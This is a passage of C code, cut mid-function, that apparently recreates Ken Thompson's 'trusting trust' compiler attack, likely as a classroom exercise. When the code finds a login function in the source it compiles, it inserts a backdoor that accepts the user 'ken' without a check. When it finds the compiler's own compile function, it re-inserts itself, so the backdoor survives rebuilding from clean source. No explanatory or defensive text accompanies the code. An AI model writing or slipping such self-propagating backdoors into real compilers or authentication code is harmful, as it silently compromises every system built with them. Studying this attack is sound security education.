    fprintf(fp, "char prog[] = {\n");
    for (int i = 0; prog[i]; i++)
        fprintf(fp, "\t%d,\n", prog[i]);
    fprintf(fp, "0 };\n");

    static char login_sig[] = "int login(char *user) {";
    static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";

    char *login_start = strstr(program, login_sig);
    if (login_start) {
        char *login_end = login_start + strlen(login_sig);
        unsigned prefix_len = login_end - program;
        fprintf(fp, "%*.*s", prefix_len, prefix_len, program);
        fprintf(fp, "\n\t%s\n", login_attack);
        program = login_end;
    }

    static char compile_sig[] = 
            "static void compile(char *program, char *outname) {\n"
            "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
            "    assert(fp);"
            ;

    char *compile_start = strstr(program, compile_sig);
    if (compile_start) {
        char *compile_end = compile_start + strlen(compile_sig);
        unsigned prefix_len = compile_end - program;
        fprintf(fp, "%*.*s", prefix_len, prefix_len, program);
        fprintf(fp, "\n\t%s\n", prog);
        program = compile_end;
    }
